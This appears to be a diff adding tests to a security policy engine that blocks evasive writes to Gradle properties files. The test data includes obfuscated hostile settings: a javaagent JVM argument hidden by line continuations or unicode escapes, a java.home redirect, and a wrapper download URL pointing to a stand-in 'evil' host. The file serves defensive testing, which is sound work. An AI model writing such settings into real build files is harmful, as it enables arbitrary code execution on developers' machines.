@@ -451,3 +451,25 @@ def test_shell_deny_and_monitor_modes(tmp_path, monkeypatch):
     assert evaluate(_shell("go env -w CC=/tmp/x"),
                     Policy(build_tool_exec={"mode": "monitor"})).action == Action.ALLOW
     assert "build-tool-exec-protect-monitor" in audit.read_text()
+
+
+# ---- QA round 3: Java properties continuation / unicode-escape forms ---------
+
+@pytest.mark.parametrize("path,content", [
+    ("gradle.properties", "org.gradle.jvmargs=-java\\\n  agent:/x.jar\n"),
+    ("gradle.properties", "org.gradle.jvmargs=-\\u006aavaagent:/x.jar\n"),
+    ("gradle.properties", "org.gradle.java\\\n  .home=/tmp/j\n"),
+    ("gradle.properties", "org.gradle.java.\\u0068ome=/tmp/j\n"),
+    ("gradle/wrapper/gradle-wrapper.properties", "distribution\\u0055rl=https\\://evil/x.zip\n"),
+    ("gradle/wrapper/gradle-wrapper.properties", "distribution\\\n    Url=https\\://evil/x.zip\n"),
+])
+def test_qa3_properties_escape_forms_gated(path, content):
+    assert _hit(evaluate(_write(path, content), EMPTY))
+
+
+def test_qa3_properties_even_backslash_not_joined():
+    # `\\` at EOL is an escaped backslash, not a continuation
+    c = "org.gradle.jvmargs=-Xmx1g\\\\\nagent=1\n"
+    assert evaluate(_write("gradle.properties", c), EMPTY).action == Action.ALLOW
+    ok = "distributionUrl=https\\://services.gradle.org/distributions/\\\n  gradle-8.5-bin.zip\n"
+    assert evaluate(_write("gradle/wrapper/gradle-wrapper.properties", ok), EMPTY).action == Action.ALLOW
